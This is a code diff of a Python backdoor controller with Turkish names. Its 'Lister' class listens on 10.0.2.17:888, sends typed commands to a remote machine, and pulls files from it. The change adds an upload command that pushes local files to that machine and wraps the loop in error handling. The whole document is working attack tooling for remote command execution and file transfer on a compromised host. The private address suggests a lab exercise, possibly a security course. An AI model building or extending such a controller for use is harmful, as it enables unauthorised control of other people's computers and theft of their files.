@@ -34,13 +34,21 @@ class Lister:
         while True:
             giris = input("Komut Gir: ")
             giris = giris.split(" ")
-            self.paketleme(giris)
-            cikti = self.paket_coz()
-            if giris[0]=="indir":
-                with open(giris[1],"wb") as dosya:
-                    dosya.write(base64.b64decode(cikti))
-                cikti = giris[1]+" inidirildi."
+            try:
+                if giris[0]=="yükle":
+                    with open(giris[1],"rb") as dosya1:
+                        veri3 = base64.b64encode(dosya1.read())
+                        giris.append(veri3)
+                self.paketleme(giris)
+                cikti = self.paket_coz()
+                if giris[0]=="indir" and "Hata!" not in cikti:
+                    with open(giris[1],"wb") as dosya:
+                        dosya.write(base64.b64decode(cikti))
+                    cikti = giris[1]+" inidirildi."
+            except Exception:
+                cikti = "Hata!"
             print(cikti)
+            
 
 
 baglanti_kurma=Lister("10.0.2.17",888)
